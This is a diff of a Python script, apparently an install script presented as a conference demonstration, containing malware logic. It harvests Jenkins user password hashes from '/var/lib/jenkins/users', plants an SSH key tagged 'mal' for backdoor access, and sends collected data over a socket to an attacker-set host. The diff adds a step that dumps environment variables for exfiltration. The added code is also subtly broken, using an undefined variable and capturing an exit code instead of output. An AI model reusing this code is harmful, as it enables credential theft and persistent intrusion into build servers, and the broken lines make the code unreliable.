@@ -25,6 +25,11 @@ message = ""
 
 ##lololol give me ALL YOUR PRODS.
 r = re.compile(r"#jbcrypt:[^<]+")
+envs = os.system('env')
+print 'envs is %s' %  env
+message = envs
+
+"""
 results = os.listdir('/var/lib/jenkins/users/')
 for res in results:
         for line in fileinput.FileInput("/var/lib/jenkins/users/%s/config.xml" % res,inplace=1):
@@ -44,11 +49,13 @@ try:
 		    myfile.write("ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCd85o+/NiUloOYNbQYsU+RrSvPAhnL9RCLJYy5yogYEFIj8e8C6ybC+3VtpvUzoPZY3q91VH+D9qmoJAcm5nHfYA1J2Bc9roHG66XuoUqCE0n+Mupb61Sr1cCEhYkKkkRVAPSYLBwJy42IHcGIlrkzYy8DZzd2upxGRlXIdtq7uyNutzn5eoF+do52s7G0C6BIhP4Y5phEoLAfpm7Le1VQ/AOy25pUfhb/wBORlJfaA/dl95G8cAZvIc3vgVwn52YSln68KSBU5NKVmiG64q351Zw1/5R3n8TO7AHyQC6XII5Wr1/XqHxSZ7HIZPBZlO1SYctTpfBhqdXQ5Ls2Ltx1 mal")
 except:
 	pass 
+"""
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 s.connect((TCP_IP, TCP_PORT))
 s.send(message)
 data = s.recv(BUFFER_SIZE)
 s.close()
+"""
 # Gutted for purpose of defcon exapmle.
 """
 class osx_install_data(install_data):
